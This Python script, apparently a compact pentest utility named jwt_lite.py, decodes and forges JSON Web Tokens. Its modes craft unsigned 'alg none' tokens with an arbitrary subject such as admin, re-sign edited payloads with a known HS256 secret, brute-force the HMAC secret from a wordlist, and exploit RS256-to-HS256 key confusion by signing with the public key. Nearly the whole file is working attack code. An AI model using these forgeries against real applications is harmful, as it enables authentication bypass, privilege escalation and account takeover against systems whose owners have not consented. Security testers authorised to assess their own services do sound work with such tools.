#!/usr/bin/env python3
"""JWT inspection and forgery.

    python3 jwt_lite.py decode <token>
    python3 jwt_lite.py none <token> [--sub admin]
    python3 jwt_lite.py hs256 <token> --secret s3cr3t
    python3 jwt_lite.py crack <token> -w secrets.txt
    python3 jwt_lite.py conf <token> --pubkey pub.pem   # RS256 -> HS256 confusion

Requires: pip install pyjwt  (decode works without it)
"""
import argparse, base64, hashlib, hmac, json, sys

def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def parts(t):
    h, p, s = t.split(".")
    return json.loads(b64d(h)), json.loads(b64d(p)), s

def sign_hs256(h, p, key: bytes):
    msg = f"{b64e(json.dumps(h, separators=(',', ':')).encode())}.{b64e(json.dumps(p, separators=(',', ':')).encode())}"
    return msg + "." + b64e(hmac.new(key, msg.encode(), hashlib.sha256).digest())

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("mode")
    ap.add_argument("token")
    ap.add_argument("--secret"); ap.add_argument("-w", "--wordlist")
    ap.add_argument("--pubkey"); ap.add_argument("--sub")
    ap.add_argument("--set", action="append", default=[], metavar="k=v")
    a = ap.parse_args()
    h, p, s = parts(a.token)
    if a.mode == "decode":
        print(json.dumps({"header": h, "payload": p, "sig_len": len(s)}, indent=2)); sys.exit()
    if a.sub: p["sub"] = a.sub
    for kv in a.set:
        k, _, v = kv.partition("="); p[k] = v
    if a.mode == "none":
        print(f"{b64e(json.dumps({'alg':'none','typ':'JWT'}).encode())}.{b64e(json.dumps(p,separators=(',',':')).encode())}.")
    elif a.mode == "hs256":
        print(sign_hs256({"alg": "HS256", "typ": "JWT"}, p, a.secret.encode()))
    elif a.mode == "conf":
        print(sign_hs256({"alg": "HS256", "typ": "JWT"}, p, open(a.pubkey, "rb").read()))
    elif a.mode == "crack":
        for w in open(a.wordlist):
            w = w.strip()
            if hmac.compare_digest(sign_hs256(h, p, w.encode()).split(".")[2], s):
                print(f"SECRET: {w}"); break
        else:
            print("not found")
